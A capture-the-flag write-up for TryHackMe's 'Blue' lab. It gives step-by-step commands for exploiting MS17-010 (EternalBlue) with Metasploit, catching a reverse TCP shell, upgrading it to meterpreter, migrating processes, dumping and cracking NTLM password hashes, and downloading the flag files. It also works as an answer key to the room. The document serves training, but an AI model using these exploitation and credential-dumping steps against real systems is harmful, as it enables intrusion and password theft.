# Blue

Room: [Blue](https://tryhackme.com/room/blue)

Rrerequisite Rooms:
1. [Nmap](https://tryhackme.com/room/furthernmap)
2. [Metasploit](https://tryhackme.com/module/metasploit)

<img width="932" height="189" alt="image" src="https://github.com/user-attachments/assets/e935a766-a301-4bec-ac14-56a4ff8c48b3" />

## Recon

Start the Lab Machine and if using your Kali Machine, connect to the TryHackMe server by `sudo openvpn <FILENAME>`

### Answer the questions below

1. Scan the machine.

write `nmap <TARGET_IP>` to scan the target system.

<img width="331" height="170" alt="image" src="https://github.com/user-attachments/assets/0e777977-f231-4a12-ba35-fa03bef896d8" />

2. How many ports are open with a port number under 1000?

3 (ports 135, 139 and 445)

4. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

ms17-010

Specifically for the EternalBlue room, you can check the smb vulnerability by: `nmap --script smb-vuln* -p445 <TARGET_IP>`

<img width="521" height="276" alt="image" src="https://github.com/user-attachments/assets/908f5d81-00c1-442e-bcef-b416f061ba94" />

This vulnerability corresponds to [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/cve-2017-0143), commonly known as EternalBlue, a critical flaw in the SMBv1 (Server Message Block version 1) protocol that allows remote attackers to execute arbitrary code on affected Windows systems without authentication.

## Gain Access

### Answer the questions below

1. Start Metasploit.

Write command: `msfconsole`

<img width="350" height="335" alt="image" src="https://github.com/user-attachments/assets/679c2023-218f-4c8b-9ed7-e65a508fddcd" />

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

Write command: `search ms17-010` to find the path of the exploit. The first option 0 is the answer: `exploit/windows/smb/ms17_010_eternalblue`

<img width="848" height="248" alt="image" src="https://github.com/user-attachments/assets/df858c6e-6009-43c6-b635-6f71d57f936a" />

Write command `use 0` to select the desired path.

<img width="598" height="78" alt="image" src="https://github.com/user-attachments/assets/a7f4a546-43aa-47b1-b1b3-110f0d31cf94" />

3. Show options and set the one required value. What is the name of this value? (All caps for submission)

Check the parameters by command: `show options`. RHOSTS is the answer of this question.

<img width="1300" height="529" alt="image" src="https://github.com/user-attachments/assets/f8a32932-7349-4250-b95c-5d027d236a1d" />

Set the `RHOSTS` parameter by: `set RHOSTS <TARGET_IP>`

Set the `LHOST` paremeter by: `set LHOST <YOUR_TUN0_IP>`. You can see your TryHackMe IP by `ipconfig`

<img width="1044" height="607" alt="image" src="https://github.com/user-attachments/assets/a982b077-4f42-4d06-bf41-1a2e9c691998" />

4. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: `set payload windows/x64/shell/reverse_tcp`. With that done, run the exploit!

<img width="455" height="40" alt="image" src="https://github.com/user-attachments/assets/b5e8ac91-ee59-4938-ac41-880d8a3f1929" />

Then write command: `exploit` to run the exploit:

<img width="1104" height="499" alt="image" src="https://github.com/user-attachments/assets/ad9b3792-0d9b-49b1-a02a-cb29ee2e663c" />

5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

To background the shell do `Ctrl + Z`:

<img width="274" height="40" alt="image" src="https://github.com/user-attachments/assets/5e87b5d7-239a-440c-9279-e4cc8e7713e7" />

## Escalate

### Answer the questions below

1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

`post/multi/manage/shell_to_meterpreter`

You can check here: [Upgrading Shells to Meterpreter](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)

2. Select this (use MODULE_PATH). Show options, what option are we required to change?

`SESSION`

Write `use post/multi/manage/shell_to_meterpreter`:

<img width="463" height="53" alt="image" src="https://github.com/user-attachments/assets/d8293628-0e16-4222-9db1-d2b1987dd93a" />

Then: `show options`:

<img width="645" height="158" alt="image" src="https://github.com/user-attachments/assets/00e49502-7698-4c9f-8081-46440d4546ff" />

3. Set the required option, you may need to list all of the sessions to find your target here.

Write `set SESSION 1` (There is only 1 session as I used `exploit` and it automatically uses the first session):

<img width="306" height="36" alt="image" src="https://github.com/user-attachments/assets/a921f875-f257-4415-bebb-12ddbff9bd90" />

4. Run! If this doesn't work, try completing the exploit from the previous task once more.

Write command: `run` and then do `Ctrl + C` to check the sessions by: `sessions -l`

<img width="1555" height="439" alt="image" src="https://github.com/user-attachments/assets/db8fcde3-eb7d-4de3-b693-b7ed84a59a0a" />

7. Once the meterpreter shell conversion completes, select that session for use.

Write: `sessions -i 2`

<img width="316" height="50" alt="image" src="https://github.com/user-attachments/assets/1c628953-3eb2-4cf4-a50e-101f0d1c362a" />

8. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

Run `getsystem` it gives "Running as System" which confirms we are running as Administrator (System).

You can check more by writing `shell` to get the Target Windows Shell and then write `whoami` which tells us we are System.

<img width="355" height="179" alt="image" src="https://github.com/user-attachments/assets/f5075c40-a9a3-4121-a78c-703d448c51ad" />

9. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

Run `ps` to get the processes running in the system. The bottom one by NT AUTHORITY\SYSTEM is PID 3008 I guess:

<img width="716" height="157" alt="image" src="https://github.com/user-attachments/assets/bdc7a3f6-b8e5-44f2-ad24-63ecfa6eb122" />

10. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

Run `migrate 3008`:

<img width="195" height="49" alt="image" src="https://github.com/user-attachments/assets/b63f6ff6-134f-4e4d-98ac-90e30855ee4c" />

## Cracking

### Answer the questions below

1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

Run `hashdump`, we can see non-default useer **Jon**:

<img width="442" height="57" alt="image" src="https://github.com/user-attachments/assets/ff8c204e-2d4b-4843-8478-f177f0b04bb2" />

2. Copy this password hash to a file and research how to crack it. What is the cracked password?

The result we got `Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::`

The fields in this Windows password hash is `username:RID:LM_hash:NTLM_hash`

The NTLM hash is important because it represents the user's actual Windows password. LM (LAN Manager) hash is an old Windows password hashing method that Microsoft used before NTLM.

NTLM (NT LAN Manager) is a Windows authentication protocol that verifies a user's password without storing the actual password.

So we will crack the NTLM hash. Copy the NTLM hash into any file you name. I did `echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt`

Then use John the Ripper to crack the password: `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

We get cracked password: `alqfna22`

<img width="504" height="107" alt="image" src="https://github.com/user-attachments/assets/851720ee-b893-4af1-8a64-1ad0ed371eb0" />

## Find flags!

### Answer the questions below

1. Flag1? This flag can be found at the system root.

We are already as System Root so the most usual drive in Windows is C where all the System information is there so we are going to guess it by: `cat C:\\flag1.txt`

<img width="385" height="118" alt="image" src="https://github.com/user-attachments/assets/57d999cb-db84-453f-9a28-e52b27790346" />

2. Flag2? This flag can be found at the location where passwords are stored within Windows.

*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 

Windows stores local account password hashes in the SAM (Security Account Manager) database. The relevant location is: `C:\Windows\System32\config`

Going to: `cd C:\\Windows\\System32\\config` then `dir` to see the current files in this directory.

We see `flag2.txt` so use `cat flag2.txt`:

<img width="802" height="300" alt="image" src="https://github.com/user-attachments/assets/e3f11b7d-d61c-4ea3-93e6-fdb305105556" />

That's pointing you toward the Administrator's profile directory.

3. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.

That's pointing you toward the Administrator's profile directory. 

I searched the `flag3.txt` by `search -f flag3.txt` and got the location but was able to access it, i guess issue with Meterpreter

<img width="375" height="80" alt="image" src="https://github.com/user-attachments/assets/2a0b6aa9-061b-4e8d-9d92-681fbd181717" />

I downloaded the flag to my local Kali machine then got the flag3: `download C:\\Users\\Jon\\Documents\\flag3.txt`

Then do `cat flag3.txt` to view the flag:

<img width="394" height="48" alt="image" src="https://github.com/user-attachments/assets/75698a08-932c-4473-944f-74738a4f3ed3" />




































